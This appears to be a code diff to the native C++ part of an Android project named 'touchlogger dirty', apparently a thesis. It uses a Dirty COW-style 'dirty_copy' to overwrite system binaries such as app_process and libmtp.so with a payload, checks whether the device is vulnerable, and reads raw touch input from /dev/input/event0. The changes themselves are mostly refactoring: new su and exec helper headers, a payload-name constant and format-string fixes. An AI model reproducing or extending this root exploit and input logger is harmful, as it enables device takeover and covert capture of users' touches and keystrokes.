@@ -8,6 +8,8 @@
 #include "dirty/file_utils/file_utils.h"
 #include "dirty/file_utils/dirty_copy.h"
 #include "dirty/lib_utils/inject.h"
+#include "utils/su_utils.h"
+#include "utils/exec_utils.h"
 
 #ifdef __aarch64__
 #define APP_PROCESS_PATH "/system/bin/app_process64"
@@ -19,8 +21,9 @@
 #define LIBMTP_PATH "/system/lib/libmtp.so"
 #endif
 
+#define EXEC_PAYLOAD_NAME "exec_payload"
 #define APP_PROCESS_FALLBACK_PATH "/system/bin/app_process"
-#define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/exec_payload"
+#define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/" EXEC_PAYLOAD_NAME
 
 // TODO: make this depend on build type
 #define DEBUG 1
@@ -36,7 +39,7 @@ char shared_payload_path[PATH_MAX];
 static bool prepareCommon(const char* localPath)
 {
   snprintf(app_process_backup_path, PATH_MAX, "%s/%s", localPath, "app_process.bak");
-  snprintf(exec_payload_path, PATH_MAX, "%s/%s", localPath, "exec_payload");
+  snprintf(exec_payload_path, PATH_MAX, "%s/%s", localPath, EXEC_PAYLOAD_NAME);
   snprintf(payload_path, PATH_MAX, "%s/%s", localPath, "payload");
   snprintf(libcutils_backup_path, PATH_MAX, "%s/%s", localPath, "libcutils.so.bak");
   snprintf(libmtp_backup_path, PATH_MAX, "%s/%s", localPath, "libmtp.so.bak");
@@ -86,7 +89,7 @@ static int createTestFile(const char* filename, const char* fileContents)
   size_t written = fwrite(fileContents, strlen(fileContents), sizeof(char), file);
   if (written != strlen(fileContents))
   {
-    LOGV("Unable to write to \"%s\": written %d instead of %d bytes: %s!",
+    LOGV("Unable to write to \"%s\": written %lu instead of %lu bytes: %s!",
          filename, written, strlen(fileContents), strerror(errno));
     fclose(file);
     return -1;
@@ -161,7 +164,7 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_isVulnerable(JNIEnv* env,
   size_t len = strlen(contents2);
   char buf[len + 1];
   memset(buf, 0, len + 1);
-  int readed = read(fd, buf, len);
+  ssize_t readed = read(fd, buf, len);
 
   close(fd);
   unlink(fileName1);
@@ -169,7 +172,7 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_isVulnerable(JNIEnv* env,
 
   if (readed != len)
   {
-    LOGV("Unable to read from \"%s\": read %d instead of %d: %s!",
+    LOGV("Unable to read from \"%s\": read %lu instead of %lu: %s!",
          fileName1, readed, len, strerror(errno));
     return (jboolean) false;
   }
@@ -186,7 +189,7 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_isVulnerable(JNIEnv* env,
 extern "C"
 JNIEXPORT jboolean JNICALL
 Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_normalInstallationIsPossible(JNIEnv* env,
-                                                                                   jclass type)
+                                                                                    jclass type)
 {
   // check we have access to input devices
   const char* inputDevicePath = "/dev/input/event0";
@@ -267,6 +270,7 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_prepareB(JNIEnv* env, jcl
       return (jboolean) false;
     }
   }
+
   LOGV("Done!");
 
   env->ReleaseStringUTFChars(localPath_, localPath);
@@ -294,7 +298,8 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_triggerA(JNIEnv* env, jcl
     {
       if (dirty_copy(payload_path, app_process_remote_path) == -1)
       {
-        LOGV("Unable to overwrite app_process (%s) with %s!", app_process_remote_path, payload_path);
+        LOGV("Unable to overwrite app_process (%s) with %s!", app_process_remote_path,
+             payload_path);
         exit(-1);
       }
       else
